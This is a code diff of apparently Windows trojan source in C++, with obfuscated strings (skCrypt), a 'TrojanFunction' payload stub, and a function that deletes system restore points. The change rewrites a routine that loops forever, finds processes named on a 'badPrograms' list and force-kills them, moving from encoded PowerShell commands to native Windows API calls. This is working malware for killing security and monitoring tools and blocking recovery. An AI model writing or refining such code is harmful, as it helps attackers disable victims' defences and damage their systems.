@@ -26,19 +26,34 @@ DWORD TrojanFunction(LPVOID params) {
     system(((string)skCrypt("start ") + (string)skCrypt("https://www.youtube.com/watch?v=dQw4w9WgXcQ")).c_str());   // just an example
 }
 
-DWORD RemoveTasks(LPVOID params) {
-    string check1 = (string)skCrypt("(get-process -ea SilentlyContinue '");
-    string check2 = (string)skCrypt("') -eq $Null");
+void RemoveTaskByName(const wstring& processName) {
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE)
+        return;
 
-    string kill1 = (string)skCrypt("Stop-Process -Force -Name '");
-    string kill2 = (string)skCrypt("'");
+    PROCESSENTRY32W procEntry;
+    procEntry.dwSize = sizeof(PROCESSENTRY32W);
 
-    while (true) {
-        for (string badProgram : badPrograms) {
-            if (Exec(RunEncCommand(check1 + badProgram + check2).c_str()) == (string)skCrypt("False\n"))
-                system(RunEncCommand(kill1 + badProgram + kill2).c_str());
-        }
+    if (Process32FirstW(hSnap, &procEntry)) {
+        do {
+            wstring currentProcessName = procEntry.szExeFile;
+            if (currentProcessName == processName) {
+                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, procEntry.th32ProcessID);
+                if (hProcess != NULL) {
+                    TerminateProcess(hProcess, 0);
+                    CloseHandle(hProcess);
+                }
+            }
+        } while (Process32NextW(hSnap, &procEntry));
     }
+
+    CloseHandle(hSnap);
+}
+
+void RemoveTasks() {
+    while (true)
+        for (const auto& processName : badPrograms)
+            RemoveTaskByName(wstring(processName.begin(), processName.end()));
 }
 
 void DeleteRestorePoints() {
